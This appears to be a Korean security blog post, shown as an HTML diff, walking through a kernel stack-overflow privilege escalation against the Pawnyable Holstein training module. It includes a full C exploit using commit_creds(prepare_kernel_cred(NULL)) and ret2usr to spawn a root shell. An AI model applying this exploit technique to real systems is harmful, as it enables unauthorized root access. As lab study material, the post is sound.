@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] KBOF · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Holsteinhttps:/">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/kernel-kbof/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-kbof/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-kbof/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] KBOF · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Holsteinhttps:/"><meta property="og:url" content="https://whrds.github.io/ko/posts/kernel-kbof/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] KBOF","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Holsteinhttps:/","datePublished":"2024-06-27","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/kernel-kbof/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/kernel-kbof/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] KBOF</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Holsteinhttps:/</p><div class="article-meta"><time datetime="2024-06-27">2024년 6월 27일</time><span>·</span><span>2 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong> </p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a></p>
+<p> [[KERNEL] Holstein Module</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※  Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting [KERNEL] Environment Setting※ 잘못된 부분이 있으면 알려주세요.</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a>)</p>
+<p>이전 게시글에서 Holstein 모듈을 활용하여 코드 분석 및 취약점을 확인했다. </p>
+<p>취약점으로 RIP 를 조작할 수 있다는 사실을 활용하여 Exploit을 해보겠다.</p>
+<h4>commit_creds()</h4>
+<hr>
+<p>cred 구조체는 프로세스에 대한 권한 정보를 가지고 있다. 그리고 이를 관리하는 것은 task_cred라는 구조체에서 하고 있다.</p>
+<pre><code>int commit_creds(struct cred *new)
+{
+	struct task_struct *task = current;
+	const struct cred *old = task-&gt;real_cred;
+
+	kdebug(&quot;commit_creds(%p{%ld})&quot;, new,
+	       atomic_long_read(&amp;new-&gt;usage));
+
+	BUG_ON(task-&gt;cred != old);
+	BUG_ON(atomic_long_read(&amp;new-&gt;usage) &lt; 1);
+
+	get_cred(new); /* we will require a ref for the subj creds too */
+
+	/* dumpability changes */
+	if (!uid_eq(old-&gt;euid, new-&gt;euid) ||
+	    !gid_eq(old-&gt;egid, new-&gt;egid) ||
+	    !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||
+	    !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||
+	    !cred_cap_issubset(old, new)) {
+		if (task-&gt;mm)
+			set_dumpable(task-&gt;mm, suid_dumpable);
+		task-&gt;pdeath_signal = 0;
+		/*
+		 * If a task drops privileges and becomes nondumpable,
+		 * the dumpability change must become visible before
+		 * the credential change; otherwise, a __ptrace_may_access()
+		 * racing with this change may be able to attach to a task it
+		 * shouldn't be able to attach to (as if the task had dropped
+		 * privileges without becoming nondumpable).
+		 * Pairs with a read barrier in __ptrace_may_access().
+		 */
+		smp_wmb();
+	}
+
+	/* alter the thread keyring */
+	if (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))
+		key_fsuid_changed(new);
+	if (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))
+		key_fsgid_changed(new);
+
+	/* do it
+	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked
+	 * in set_user().
+	 */
+	if (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)
+		inc_rlimit_ucounts(new-&gt;ucounts, UCOUNT_RLIMIT_NPROC, 1);
+	rcu_assign_pointer(task-&gt;real_cred, new);
+	rcu_assign_pointer(task-&gt;cred, new);
+	if (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)
+		dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, 1);
+...
+</code></pre>
+<p>commit_creds()는 new cred 구조체를 인자로 받아온다. 그리고 나서 프로세스의 각 권한 정보들을 new cred 구조체의 정보로 설정해주는 역할을 한다.</p>
+<h4>init_cred</h4>
+<hr>
+<pre><code>struct cred init_cred = {
+	.usage			= ATOMIC_INIT(4),
+	.uid			= GLOBAL_ROOT_UID,
+	.gid			= GLOBAL_ROOT_GID,
+	.suid			= GLOBAL_ROOT_UID,
+	.sgid			= GLOBAL_ROOT_GID,
+	.euid			= GLOBAL_ROOT_UID,
+	.egid			= GLOBAL_ROOT_GID,
+	.fsuid			= GLOBAL_ROOT_UID,
+	.fsgid			= GLOBAL_ROOT_GID,
+	.securebits		= SECUREBITS_DEFAULT,
+	.cap_inheritable	= CAP_EMPTY_SET,
+	.cap_permitted		= CAP_FULL_SET,
+	.cap_effective		= CAP_FULL_SET,
+	.cap_bset		= CAP_FULL_SET,
+	.user			= INIT_USER,
+	.user_ns		= &amp;init_user_ns,
+	.group_info		= &amp;init_groups,
+	.ucounts		= &amp;init_ucounts,
+};
+</code></pre>
+<p>cred 구조체 중 init_cred를 살펴보면 uid, gid 등을 포함한 값들이 ROOT 권한을 가리키고 있다.</p>
+<p>여기까지 확인했을 때, commit_creds()의 인자로 init_cred 구조체를 전달해주면 프로세스의 권한 정보를 root로 변경할 수 있게 된다.</p>
+<h4>prepare_kernel_cred</h4>
+<hr>
+<pre><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)
+{
+	const struct cred *old;
+	struct cred *new;
+
+	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
+	if (!new)
+		return NULL;
+
+	kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);
+
+	if (daemon)
+		old = get_task_cred(daemon);
+	else
+		old = get_cred(&amp;init_cred);
+
+	validate_creds(old);
+...
+</code></pre>
+<p>linux kernel 6.2 이전 버젼에서는 prepare_kernel_cred()의 인자가 NULL인 경우 init_cred 구조체를 반환한다. </p>
+<p>이전 게시글에서 RIP를 변조하는 것을 했었는데, RIP 위치에 아래 코드를 입력하게 되면 우리는 일반 사용자가 아닌 root 사용자로 권한 상승일 일어나게 된다.</p>
+<pre><code>commit_cred(prepare_kernel_cred(NULL))
+</code></pre>
+<h4>ret2usr</h4>
+<hr>
+<p>이전까지 확인한 내용은 커널 영역에서 작동한다. 원하는 값으로 overwrite를 성공했다면 다시 유저 영역으로 돌아와야 한다.</p>
+<p><strong>swapgs</strong></p>
+<p>intel 아키텍처의 swapgs라는 명령어를 사용한다.  커널 모드에서 유저 모드로 넘어갈 때 GS Segment가 다르게 설정된다. 떄문에 커널 영역에서 유저 영역으로 다시 복귀하기 전에 해당 명령어를 활용하여 GS Segment를 설정해주어야 한다.</p>
+<p><strong>iretq</strong></p>
+<p>커널 영역에서 사용자 영역으로 넘어갈 때 사용되는 명령어이다.</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/001.png" alt=""></p>
+<p>다시 정리를 해보면, 커널 영역에서 아래 코드를 실행되게 한다.</p>
+<pre><code>commit_cred(prepare_kernel_cred(NULL))
+</code></pre>
+<p>이후 swapgs로 GS Segment를 설정해주고 나서 iretq로 유저 영역으로 돌아와야 한다.</p>
+<p>이를 위한 기본적인 스크립트이다.</p>
+<pre><code>static void win() {
+ char *argv[] = { &quot;/bin/sh&quot;, NULL };
+ char *envp[] = { NULL };
+ puts(&quot;[+] win!&quot;);
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+
+static void save_state() {
+ asm(
+      &quot;movq %%cs, %0\n&quot;
+      &quot;movq %%ss, %1\n&quot;
+      &quot;movq %%rsp, %2\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+static void restore_state() {
+  asm volatile(&quot;swapgs ;&quot;
+               &quot;movq %0, 0x20(%%rsp)\t\n&quot;
+               &quot;movq %1, 0x18(%%rsp)\t\n&quot;
+               &quot;movq %2, 0x10(%%rsp)\t\n&quot;
+               &quot;movq %3, 0x08(%%rsp)\t\n&quot;
+               &quot;movq %4, 0x00(%%rsp)\t\n&quot;
+               &quot;iretq&quot;
+               :
+               : &quot;r&quot;(user_ss),
+ &quot;r&quot;(user_rsp),
+ &quot;r&quot;(user_rflags),
+ &quot;r&quot;(user_cs), &quot;r&quot;(win));
+}
+</code></pre>
+<p>코드를 살펴보면 shell을 위한 win()가 있는 것을 확인할 수 있다.</p>
+<p>권한 자체를 일반 사용자에서 root로 상승하더라도 바로 shell이 따지는 것은 아니다. 말 그대로 프로세스의 실행 권한을 root로 바꾸었다는 것이기 때문에 shell을 위해서는 코드 상에서 /bin/sh를 실행하는 함수를 설정해주어야 한다.</p>
+<h4>Exploit</h4>
+<hr>
+<p>Exploit을 하기 위해서는 유저 영역에서의 BoF와 마찬가지로 buf와 ret 사이의 offset을 구해야 한다.</p>
+<p>./root/vuln.ko 파일을 활용하여 취약한 함수인 _copy_from_user의 offset을 구한다.</p>
+<p>.</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/002.png" alt=""></p>
+<p>offset이 0x190인 것을 확인했다.</p>
+<p>이제 커널에 접속하여 base 주소를 구해보겠다. </p>
+<p>아래 명령을 입력하면 base 주소를 쉽게 구할 수 있다.</p>
+<pre><code>cat /proc/moduls
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/003.png" alt=""></p>
+<p>gdb를 실행하여 아래와 같이 kernel에 연결해준다.</p>
+<pre><code>target remote localhost:12345
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/004.png" alt=""></p>
+<p>[ 연결을 위해서는 run.sh에 gdb tcp 설정을 추가해줘야 한다. - 이전 게시글에서 다루었다.]</p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting">https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting</a> </p>
+<p> [[KERNEL] Environment Setting</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ <a href="https://lrl.kr/JT5m">https://lrl.kr/JT5m</a> カーネルexploitへの導入 | PAWNYABLE!カーネルexploitへの導入 「ユーザーランドのpwnは一通り勉強したけ</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting">https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting</a>)</p>
+<p>커널에서는 이전에 만들었던 Segment fault를 발생시키는 바이너리를 실행해준다.</p>
+<p>[코드를 0x500 -&gt; 0x400으로 수정하고 진행했다]</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/005.png" alt=""></p>
+<p>_copy_from_user() 호출 전</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/006.png" alt=""></p>
+<p>_copy_from_user() 호출 후</p>
+<p>rbp, ret 이후의 0x10까지 값이 덮인 것을 확인할 수 있다.</p>
+<p>buf - ret의 offset은 0x408이다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+unsigned long prepare_kernel_cred = 0xffffffff8106e240;
+unsigned long commit_creds = 0xffffffff8106e390;
+
+static void win() {
+        char *argv[] = { &quot;/bin/sh&quot;, NULL };
+        char *evnp[] = { NULL };
+        puts(&quot;[+] win!&quot;);
+        execve(&quot;/bin/sh&quot;, argv, evnp);
+}
+
+static void save_state() {
+        asm(
+            &quot;movq %%cs, %0\n&quot;
+            &quot;movq %%ss, %1\n&quot;
+            &quot;movq %%rsp, %2\n&quot;
+            &quot;pushfq\n&quot;
+            &quot;popq %3\n&quot;
+            : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags
+)
+	  :
+      : &quot;memory&quot;);
+}
+
+static void restore_state() {
+  asm volatile(&quot;swapgs ;&quot;
+               &quot;movq %0, 0x20(%%rsp)\t\n&quot;
+               &quot;movq %1, 0x18(%%rsp)\t\n&quot;
+               &quot;movq %2, 0x10(%%rsp)\t\n&quot;
+               &quot;movq %3, 0x08(%%rsp)\t\n&quot;
+               &quot;movq %4, 0x00(%%rsp)\t\n&quot;
+               &quot;iretq&quot;
+               :
+               : &quot;r&quot;(user_ss),
+ &quot;r&quot;(user_rsp),
+ &quot;r&quot;(user_rflags),
+ &quot;r&quot;(user_cs), &quot;r&quot;(win));
+}
+
+static void escalate_privilege() {
+        char* (*pkc)(int) = (void*)(prepare_kernel_cred);
+        void (*cc)(char*) = (void*)(commit_creds);
+        (*cc)((*pkc)(0));
+        restore_state();
+}
+
+int main() {
+    save_state();
+    int fd = open(&quot;/dev/holstein&quot;, 2);
+
+    char buf[0x410];
+    memset(buf, 'A', 0x410);
+    *(unsigned long*)&amp;buf[0x408] = (unsigned long)&amp;escalate_privilege;
+    write(fd, buf, 0x410);
+
+    close(fd);
+    return 0;
+}
+</code></pre>
+<p>main()에다가 ret위치에 권한 상승이 발생하도록 값을 넣어주는 최종 exploit code이다.</p>
+<p>결과 확인을 위해 root 권한으로 설정했던 부분을 다시 1337로 설정하고 진행하겠다.</p>
+<p>./root/etc/init.d 파일을 수정해주면 된다.</p>
+<pre><code>#!/bin/sh
+
+##
+## Setup
+##
+mdev -s
+mount -t proc none /proc
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+stty -opost
+#echo 2 &gt; /proc/sys/kernel/kptr_restrict
+#echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+
+##
+## Install driver
+##
+insmod /root/vuln.ko
+mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
+
+##
+## User shell
+##
+echo -e &quot;\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n&quot;
+echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot;
+setsid cttyhack setuidgid 1337 sh
+
+##
+## Cleanup
+##
+umount /proc
+poweroff -d 0 -f
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/007.png" alt=""></p>
+<p>성공적으로 권한 상승 후 shell을 얻은 것을 볼 수 있다.</p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/kernel-kbof/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
